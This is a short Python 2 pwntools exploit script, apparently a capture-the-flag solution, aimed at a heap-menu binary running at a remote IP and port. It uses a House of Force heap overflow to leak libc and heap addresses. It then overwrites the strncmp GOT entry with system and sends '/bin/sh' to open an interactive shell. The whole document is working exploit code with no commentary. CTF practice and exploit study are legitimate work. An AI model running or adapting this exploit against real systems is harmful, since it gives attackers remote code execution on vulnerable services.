#!/usr/bin/env python2
from pwn import *
from LibcSearcher import *
from struct import pack
import os, base64, math, time
context(arch = "amd64",os = "linux", log_level = "debug")

def choice(data):
    p.sendline(data)

def new(index, size, data):
    choice('+++')
    p.recvuntil("Index:")
    p.sendline(str(index))
    p.recvuntil("Size: ")
    p.sendline(str(size))
    p.recvuntil("Data: ")
    p.sendline(data)

def show(index, size):
    choice('print')
    p.recvuntil("Index: ")
    p.sendline(str(index))
    p.recvuntil("Size: ")
    p.sendline(str(size))

p = remote("123.57.69.203", 5330)
# p = process('./attachment-33')
elf = ELF('./attachment-33')

# gdb_command = ""
# gdb.attach(p, gdb_command)
# time.sleep(1)

# House of Force

# Stage 1: Leak libc
p.sendline("\xff" * 8)
new(0, 0x18, '\xff' * 0x18 + '\x81\x0d\x00')
new(1, 0x1008, '\xff' * 0x1008 + '\xf1\x0f\x00')
show(0, 0x28)
p.recv(0x20)
malloc_hook_addr = u64(p.recv(8)) - 0x70
log.info("malloc_hook addr: " + hex(malloc_hook_addr))
libc = LibcSearcher('__malloc_hook', malloc_hook_addr)
libc_base = malloc_hook_addr - libc.dump('__malloc_hook')
system = libc_base + libc.dump('system')
log.info('libc_base:' + hex(libc_base))
log.info('system:' + hex(system))

# Stage 2: Leak heap address
new(2, 0x1008, '\xff' * 0x1008 + '\xf1\x0f\x00')
new(3, 0x1008, '\xff' * 0x1008 + '\xf1\x0f\x00')
new(4, 0x1008, '\xff' * 0x1008 + p64(0xffffffffffffff00))
show(1, 0x1018)
p.recv(0x1000)
p.recv(0x10)
top_chunk_addr = u64(p.recv(8)) + 0x44000
log.info("top chunk addr: " + hex(top_chunk_addr))

# Stage 3: Write system_libc to strncmp's GOT entry
strncmp_got = 0x601018
new(5, strncmp_got - top_chunk_addr - 0x20, 'a')
for _ in range(12):
    new(6, 0x500, "\xff" * 8 + p64(system))
choice("/bin/sh")

p.interactive()
